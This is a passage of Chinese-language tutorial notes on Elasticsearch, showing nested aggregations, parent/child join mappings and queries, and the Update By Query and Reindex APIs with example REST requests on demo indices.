class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"># Nested Aggregation</span><br><span class="line">POST my_movies/_search</span><br><span class="line">&#123;</span><br><span class="line">  <span class="attr">"size"</span>: <span class="number">0</span>,</span><br><span class="line">  <span class="attr">"aggs"</span>: &#123;</span><br><span class="line">    <span class="attr">"actors"</span>: &#123;</span><br><span class="line">      <span class="attr">"nested"</span>: &#123;</span><br><span class="line">        <span class="attr">"path"</span>: <span class="string">"actors"</span></span><br><span class="line">      &#125;,</span><br><span class="line">      <span class="attr">"aggs"</span>: &#123;</span><br><span class="line">        <span class="attr">"actor_name"</span>: &#123;</span><br><span class="line">          <span class="attr">"terms"</span>: &#123;</span><br><span class="line">            <span class="attr">"field"</span>: <span class="string">"actors.first_name"</span>,</span><br><span class="line">            <span class="attr">"size"</span>: <span class="number">10</span></span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 普通 aggregation不工作</span></span><br><span class="line">POST my_movies/_search</span><br><span class="line">&#123;</span><br><span class="line">  <span class="attr">"size"</span>: <span class="number">0</span>,</span><br><span class="line">  <span class="attr">"aggs"</span>: &#123;</span><br><span class="line">    <span class="attr">"NAME"</span>: &#123;</span><br><span class="line">      <span class="attr">"terms"</span>: &#123;</span><br><span class="line">        <span class="attr">"field"</span>: <span class="string">"actors.first_name"</span>,</span><br><span class="line">        <span class="attr">"size"</span>: <span class="number">10</span></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="文档的父子关系"><a href="#文档的父子关系" class="headerlink" title="文档的父子关系"></a>文档的父子关系</h2><h3 id="Parent-Child"><a href="#Parent-Child" class="headerlink" title="Parent / Child"></a>Parent / Child</h3><ul><li>对象和 Nested 对象的局限性<ul><li>每次更新，需要重新索引整个对象（包括跟对象和嵌套对象）</li></ul></li><li>ES 提供了类似关系型数据库中 Join 的实现。使用 Join 数据类型实现，可以通过维护 Parent / Child 的关系，从而分离两个对象<ul><li>父文档和子文档是两个独立的文档</li><li>更新父文档无需重新索引整个子文档。子文档被新增，更改和删除也不会影响到父文档和其他子文档。</li></ul></li></ul><h3 id="父子关系"><a href="#父子关系" class="headerlink" title="父子关系"></a>父子关系</h3><ul><li>定义父子关系的几个步骤<ul><li>设置索引的 Mapping</li><li>索引父文档</li><li>索引子文档</li><li>按需查询文档</li></ul></li></ul><h3 id="设置-Mapping"><a href="#设置-Mapping" class="headerlink" title="设置 Mapping"></a>设置 Mapping</h3><p><img src="/images/big-data/es-06/36.jpg" alt="36"></p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">DELETE my_blogs</span><br><span class="line"><span class="comment">// 设定 Parent/Child Mapping</span></span><br><span class="line">PUT my_blogs</span><br><span class="line">&#123;</span><br><span class="line">  <span class="attr">"settings"</span>: &#123;</span><br><span class="line">    <span class="attr">"number_of_shards"</span>: <span class="number">2</span></span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="attr">"mappings"</span>: &#123;</span><br><span class="line">    <span class="attr">"properties"</span>: &#123;</span><br><span class="line">      <span class="attr">"blog_comments_relation"</span>: &#123;</span><br><span class="line">        <span class="attr">"type"</span>: <span class="string">"join"</span>,</span><br><span class="line">        <span class="attr">"relations"</span>: &#123;</span><br><span class="line">          <span class="attr">"blog"</span>: <span class="string">"comment"</span></span><br><span class="line">        &#125;</span><br><span class="line">      &#125;,</span><br><span class="line">      <span class="attr">"content"</span>: &#123;</span><br><span class="line">        <span class="attr">"type"</span>: <span class="string">"text"</span></span><br><span class="line">      &#125;,</span><br><span class="line">      <span class="attr">"title"</span>: &#123;</span><br><span class="line">        <span class="attr">"type"</span>: <span class="string">"keyword"</span></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="索引父文档"><a href="#索引父文档" class="headerlink" title="索引父文档"></a>索引父文档</h3><p><img src="/images/big-data/es-06/37.jpg" alt="37"></p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">PUT my_blogs/_doc/blog1</span><br><span class="line">&#123;</span><br><span class="line">  <span class="attr">"title"</span>:<span class="string">"Learning Elasticsearch"</span>,</span><br><span class="line">  <span class="attr">"content"</span>:<span class="string">"learning ELK @ geektime"</span>,</span><br><span class="line">  <span class="attr">"blog_comments_relation"</span>:&#123;</span><br><span class="line">    <span class="attr">"name"</span>:<span class="string">"blog"</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">PUT my_blogs/_doc/blog2</span><br><span class="line">&#123;</span><br><span class="line">  <span class="attr">"title"</span>:<span class="string">"Learning Hadoop"</span>,</span><br><span class="line">  <span class="attr">"content"</span>:<span class="string">"learning Hadoop"</span>,</span><br><span class="line">    <span class="attr">"blog_comments_relation"</span>:&#123;</span><br><span class="line">    <span class="attr">"name"</span>:<span class="string">"blog"</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="索引子文档"><a href="#索引子文档" class="headerlink" title="索引子文档"></a>索引子文档</h3><ul><li>父文档和子文档必须存在相同的分片上<ul><li>确保查询 join 的性能</li></ul></li><li>当指定子文档时候，必须指定它的父文档 ID<ul><li>使用 route 参数来保证，分配到相同的分片</li></ul></li></ul><p><img src="/images/big-data/es-06/38.jpg" alt="38"></p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 索引子文档</span></span><br><span class="line">PUT my_blogs/_doc/comment1?routing=blog1</span><br><span class="line">&#123;</span><br><span class="line">  <span class="attr">"comment"</span>:<span class="string">"I am learning ELK"</span>,</span><br><span class="line">  <span class="attr">"username"</span>:<span class="string">"Jack"</span>,</span><br><span class="line">  <span class="attr">"blog_comments_relation"</span>:&#123;</span><br><span class="line">    <span class="attr">"name"</span>:<span class="string">"comment"</span>,</span><br><span class="line">    <span class="attr">"parent"</span>:<span class="string">"blog1"</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">PUT my_blogs/_doc/comment2?routing=blog2</span><br><span class="line">&#123;</span><br><span class="line">  <span class="attr">"comment"</span>:<span class="string">"I like Hadoop!!!!!"</span>,</span><br><span class="line">  <span class="attr">"username"</span>:<span class="string">"Jack"</span>,</span><br><span class="line">  <span class="attr">"blog_comments_relation"</span>:&#123;</span><br><span class="line">    <span class="attr">"name"</span>:<span class="string">"comment"</span>,</span><br><span class="line">    <span class="attr">"parent"</span>:<span class="string">"blog2"</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">PUT my_blogs/_doc/comment3?routing=blog2</span><br><span class="line">&#123;</span><br><span class="line">  <span class="attr">"comment"</span>:<span class="string">"Hello Hadoop"</span>,</span><br><span class="line">  <span class="attr">"username"</span>:<span class="string">"Bob"</span>,</span><br><span class="line">  <span class="attr">"blog_comments_relation"</span>:&#123;</span><br><span class="line">    <span class="attr">"name"</span>:<span class="string">"comment"</span>,</span><br><span class="line">    <span class="attr">"parent"</span>:<span class="string">"blog2"</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Parent-Child-所支持的查询"><a href="#Parent-Child-所支持的查询" class="headerlink" title="Parent / Child 所支持的查询"></a>Parent / Child 所支持的查询</h3><ul><li>查询所有文档</li><li>Parent Id 查询</li><li>Has Child 查询</li><li>Has Parent 查询</li></ul><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 查询所有文档</span></span><br><span class="line">POST my_blogs/_search</span><br><span class="line">&#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 根据父文档ID查看</span></span><br><span class="line">GET my_blogs/_doc/blog2</span><br><span class="line"></span><br><span class="line"><span class="comment">// Parent Id 查询</span></span><br><span class="line">POST my_blogs/_search</span><br><span class="line">&#123;</span><br><span class="line"><span class="attr">"query"</span>: &#123;</span><br><span class="line">  <span class="attr">"parent_id"</span>: &#123;</span><br><span class="line">    <span class="attr">"type"</span>: <span class="string">"comment"</span>,</span><br><span class="line">    <span class="attr">"id"</span>: <span class="string">"blog2"</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Has Child 查询,返回父文档</span></span><br><span class="line">POST my_blogs/_search</span><br><span class="line">&#123;</span><br><span class="line"><span class="attr">"query"</span>: &#123;</span><br><span class="line">  <span class="attr">"has_child"</span>: &#123;</span><br><span class="line">    <span class="attr">"type"</span>: <span class="string">"comment"</span>,</span><br><span class="line">    <span class="attr">"query"</span> : &#123;</span><br><span class="line">          <span class="attr">"match"</span>: &#123;</span><br><span class="line">              <span class="attr">"username"</span> : <span class="string">"Jack"</span></span><br><span class="line">          &#125;</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Has Parent 查询，返回相关的子文档</span></span><br><span class="line">POST my_blogs/_search</span><br><span class="line">&#123;</span><br><span class="line"><span class="attr">"query"</span>: &#123;</span><br><span class="line">  <span class="attr">"has_parent"</span>: &#123;</span><br><span class="line">    <span class="attr">"parent_type"</span>: <span class="string">"blog"</span>,</span><br><span class="line">    <span class="attr">"query"</span> : &#123;</span><br><span class="line">          <span class="attr">"match"</span>: &#123;</span><br><span class="line">              <span class="attr">"title"</span> : <span class="string">"Learning Hadoop"</span></span><br><span class="line">          &#125;</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="使用-has-child-查询"><a href="#使用-has-child-查询" class="headerlink" title="使用 has_child 查询"></a>使用 has_child 查询</h3><ul><li>返回父文档</li><li>通过对子文档进行查询<ul><li>返回具体相关子文档的父文档</li><li>父子文档在相同的分片上，因此 Join 效率高</li></ul></li></ul><p><img src="/images/big-data/es-06/39.jpg" alt="39"></p><h3 id="使用-has-parent-查询"><a href="#使用-has-parent-查询" class="headerlink" title="使用 has_parent 查询"></a>使用 has_parent 查询</h3><ul><li>返回相关性的子文档</li><li>通过对父文档进行查询<ul><li>返回相关的子文档</li></ul></li></ul><p><img src="/images/big-data/es-06/40.jpg" alt="40"></p><h3 id="使用-parent-id-查询"><a href="#使用-parent-id-查询" class="headerlink" title="使用 parent_id 查询"></a>使用 parent_id 查询</h3><ul><li>返回所有相关子文档</li><li>通过对付文档 Id 进行查询<ul><li>返回所有相关的子文档</li></ul></li></ul><p><img src="/images/big-data/es-06/41.jpg" alt="41"></p><h3 id="访问子文档"><a href="#访问子文档" class="headerlink" title="访问子文档"></a>访问子文档</h3><p>需指定父文档 routing 参数</p><p><img src="/images/big-data/es-06/42.jpg" alt="42"></p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 通过ID ，访问子文档</span></span><br><span class="line">GET my_blogs/_doc/comment2</span><br><span class="line"></span><br><span class="line"><span class="comment">// 通过ID和routing ，访问子文档</span></span><br><span class="line">GET my_blogs/_doc/comment3?routing=blog2</span><br></pre></td></tr></table></figure><h3 id="更新子文档"><a href="#更新子文档" class="headerlink" title="更新子文档"></a>更新子文档</h3><p>更新子文档不会影响到父文档</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 更新子文档</span></span><br><span class="line">PUT my_blogs/_doc/comment3?routing=blog2</span><br><span class="line">&#123;</span><br><span class="line">    <span class="attr">"comment"</span>: <span class="string">"Hello Hadoop??"</span>,</span><br><span class="line">    <span class="attr">"blog_comments_relation"</span>: &#123;</span><br><span class="line">      <span class="attr">"name"</span>: <span class="string">"comment"</span>,</span><br><span class="line">      <span class="attr">"parent"</span>: <span class="string">"blog2"</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="嵌套对象-v-s-父子文档"><a href="#嵌套对象-v-s-父子文档" class="headerlink" title="嵌套对象 v.s 父子文档"></a>嵌套对象 v.s 父子文档</h3><table><thead><tr><th align="left"></th><th align="left">Nested Object</th><th align="left">Parent / Child</th></tr></thead><tbody><tr><td align="left">优点</td><td align="left">文档存储在一起，读取性能高</td><td align="left">父子文档可以独立更新</td></tr><tr><td align="left">缺点</td><td align="left">更新嵌套的子文档时，需要更新整个文档</td><td align="left">需要额外的内存去维护关系。读取性能相对差</td></tr><tr><td align="left">适用场景</td><td align="left">子文档偶尔更新，以查询为主</td><td align="left">子文档更新频繁</td></tr></tbody></table><h2 id="Update-By-Query-amp-Reindex-API"><a href="#Update-By-Query-amp-Reindex-API" class="headerlink" title="Update By Query &amp; Reindex API"></a>Update By Query &amp; Reindex API</h2><h2 id="使用场景"><a href="#使用场景" class="headerlink" title="使用场景"></a>使用场景</h2><ul><li>一般在以下几种情况时，我们需要重建索引：<ul><li>索引的 Mappings 发生变更：字段类型更改，分词器及字典更新</li><li>索引的 Setting 发生变更：索引的主分片数发生改变</li><li>集群内，集群间需要做数据迁移</li></ul></li><li>ElastiicSearch 的内置提供的 API<ul><li>Update By Query : 在现有索引上重建</li><li>Reindex：在其他索引上重建索引</li></ul></li></ul><h3 id="案例一：为索引增加子字段"><a href="#案例一：为索引增加子字段" class="headerlink" title="案例一：为索引增加子字段"></a>案例一：为索引增加子字段</h3><ul><li>改变 Mapping ， 增加子字段，使用英文分词器</li><li>此时尝试对子字段进行查询</li><li>虽然有数据已经存在，但是没有返回结果</li></ul><p><img src="/images/big-data/es-06/43.jpg" alt="43"></p><h3 id="Update-By-Query"><a href="#Update-By-Query" class="headerlink" title="Update By Query"></a>Update By Query</h3><ul><li>执行 Update By Query</li><li>尝试对 Multi-Fields 查询查询</li><li>返回结果</li></ul><p><img src="/images/big-data/es-06/44.jpg" alt="44"></p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 写入文档</span></span><br><span class="line">PUT blogs/_doc/1</span><br><span class="line">&#123;</span><br><span class="line">  <span class="attr">"content"</span>:<span class="string">"Hadoop is cool"</span>,</span><br><span class="line">  <span class="attr">"keyword"</span>:<span class="string">"hadoop"</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 修改 Mapping，增加子字段，使用英文分词器</span></span><br><span class="line">PUT blogs/_mapping</span><br><span class="line">&#123;</span><br><span class="line">  <span class="attr">"properties"</span> : &#123;</span><br><span class="line">    <span class="attr">"content"</span> : &#123;</span><br><span class="line">      <span class="attr">"type"</span> : <span class="string">"text"</span>,</span><br><span class="line">      <span class="attr">"fields"</span> : &#123;</span><br><span class="line">        <span class="attr">"english"</span> : &#123;</span><br><span class="line">          <span class="attr">"type"</span> : <span class="string">"text"</span>,</span><br><span class="line">          <span class="attr">"analyzer"</span>:<span class="string">"english"</span></span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 写入文档</span></span><br><span class="line">PUT blogs/_doc/2</span><br><span class="line">&#123;</span><br><span class="line">  <span class="attr">"content"</span>:<span class="string">"Elasticsearch rocks"</span>,</span><br><span class="line">  <span class="attr">"keyword"</span>:<span class="string">"elasticsearch"</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 查询新写入文档</span></span><br><span class="line">POST blogs/_search</span><br><span class="line">&#123;</span><br><span class="line">  <span class="attr">"query"</span>: &#123;</span><br><span class="line">    <span class="attr">"match"</span>: &#123;</span><br><span class="line">      <span class="attr">"content.english"</span>: <span class="string">"Elasticsearch"</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 查询 Mapping 变更前写入的文档</span></span><br><span class="line">POST blogs/_search</span><br><span class="line">&#123;</span><br><span class="line">  <span class="attr">"query"</span>: &#123;</span><br><span class="line">    <span class="attr">"match"</span>: &#123;</span><br><span class="line">      <span class="attr">"content.english"</span>: <span class="string">"hadoop"</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Update所有文档</span></span><br><span class="line">POST blogs/_update_by_query</span><br><span class="line">&#123;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="案例二：更改已有字段类型的-Mappings"><a href="#案例二：更改已有字段类型的-Mappings" class="headerlink" title="案例二：更改已有字段类型的 Mappings"></a>案例二：更改已有字段类型的 Mappings</h3><ul><li>ES 不允许在原有 Mapping 上对字段类型进行修改</li><li>只能创建新的索引，并设定正确的字段类型，在重新导入数据</li></ul><p><img src="/images/big-data/es-06/45.jpg" alt="45"></p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 创建新的索引并且设定新的Mapping</span></span><br><span class="line">PUT blogs_fix/</span><br><span class="line">&#123;</span><br><span class="line">  <span class="attr">"mappings"</span>: &#123;</span><br><span class="line">    <span class="attr">"properties"</span>: &#123;</span><br><span class="line">      <span class="attr">"content"</span>: &#123;</span><br><span class="line">        <span class="attr">"type"</span>: <span class="string">"text"</span>,</span><br><span class="line">        <span class="attr">"fields"</span>: &#123;</span><br><span class="line">          <span class="attr">"english"</span>: &#123;</span><br><span class="line">            <span class="attr">"type"</span>: <span class="string">"text"</span>,</span><br><span class="line">            <span class="attr">"analyzer"</span>: <span class="string">"english"</span></span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;,</span><br><span class="line">      <span class="attr">"keyword"</span>: &#123;</span><br><span class="line">        <span class="attr">"type"</span>: <span class="string">"keyword"</span></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Reindx API</span></span><br><span class="line">POST _reindex</span><br><span class="line">&#123;</span><br><span class="line">  <span class="attr">"source"</span>: &#123;</span><br><span class="line">    <span class="attr">"index"</span>: <span class="string">"blogs"</span></span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="attr">"dest"</span>: &#123;</span><br><span class="line">    <span class="attr">"index"</span>: <span class="string">"blogs_fix"</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">GET  blogs_fix/_doc/1</span><br><span class="line"></span><br><span class="line"><span class="comment">// 测试 Term Aggregation</span></span><br><span class="line">POST blogs_fix/_search</span><br><span class="line">&#123;</span><br><span class="line">  <span class="attr">"size"</span>: <span class="number">0</span>,</span><br><span class="line">  <span class="attr">"aggs"</span>: &#123;</span><br><span class="line">    <span class="attr">"blog_keyword"</span>: &#123;</span><br><span class="line">      <span class="attr">"terms"</span>: &#123;</span><br><span class="line">        <span class="attr">"field"</span>: <span class="string">"keyword"</span>,</span><br><span class="line">        <span class="attr">"size"</span>: <span class="number">10</span></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Reindex-API"><a href="#Reindex-API" class="headerlink" title="Reindex API"></a>Reindex API</h3><ul><li>Reindex API 支持把文档从一个索引拷贝到另外一个索引</li><li>使用 Reindex API 的一些场景<ul><li>修改索引的主分片数</li><li>改变字段的 Mapping 中的字段类型</li><li>集群中数据迁移、跨集群的数据迁移</li></ul></li></ul><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Reindx API，version Type Internal</span></span><br><span class="line">POST  _reindex</span><br><span class="line">&#123;</span><br><span class="line">  <span class="attr">"source"</span>: &#123;</span><br><span class="line">    <span class="attr">"index"</span>: <span class="string">"blogs"</span></span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="attr">"dest"</span>: &#123;</span><br><span class="line">    <span class="attr">"index"</span>: <span class="string">"blogs_fix"</span>,</span><br><span class="line">    <span class="attr">"version_type"</span>: <span class="string">"internal"</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 文档版本号增加</span></span><br><span class="line">GET  blogs_fix/_doc/1</span><br><span class="line"></span><br><span class="line"><span class="comment">// Reindx API，version Type Internal</span></span><br><span class="line">POST  _reindex</span><br><span class="line">&#123;</span><br><span class="line">  <span class="attr">"source"</span>: &#123;</span><br><span class="line">    <span class="attr">"index"</span>: <span class="string">"blogs"</span></span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="attr">"dest"</span>: &#123;</span><br><span class="line">    <span class="attr">"index"</span>: <span class="string">"blogs_fix"</span>,</span><br><span class="line">    <span class="attr">"version_type"</span>: <span class="string">"external"</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Reindx API，version Type Internal</span></span><br><span class="line">POST  _reindex</span><br><span class="line">&#123;</span><br><span class="line">  <span class="attr">"source"</span>: &#123;</span><br><span class="line">    <span class="attr">"index"</span>: <span class="string">"blogs"</span></span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="attr">"dest"</span>: &#123;</span><br><span class="line">    <span class="attr">"index"</span>: <span class="string">"blogs_fix"</span>,</span><br><span class="line">    <span class="attr">"version_type"</span>: <span class="string">"external"</span></span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="attr">"conflicts"</span>: <span class="string">"proceed"</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="两个注意点"><a href="#两个注意点" class="headerlink" title="两个注意点"></a>两个注意点</h3><ul><li>索引的 mapping _source 要开启</li><li>先创建一个新索引，然后在执行 reindex</li></ul><h3 id="OP-Type"><a href="#OP-Type" class="headerlink" title="OP Type"></a>OP Type</h3><ul><li>_reindex 指挥创建不存在的文档</li><li>文档如果存在，会导致版本冲突</li></ul><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Reindx API，version Type Internal</span></span><br><span class="line">POST _reindex</span><br><span class="line">&#123;</span><br><span class="line">  <span class="attr">"source"</span>: &#123;</span><br><span class="line">    <span class="attr">"index"</span>: <span class="string">"blogs"</span></span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="attr">"dest"</span>: &#123;</span><br><span class="line">    <span class="attr">"index"</span>: <span class="string">"blogs_fix"</span>,</span><br><span class="line">    <span class="attr">"op_type"</span>: <span class="string">"create"</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="跨集群-ReIndex"><a href="#跨集群-ReIndex" class="headerlink" title="跨集群 ReIndex"></a>跨集群 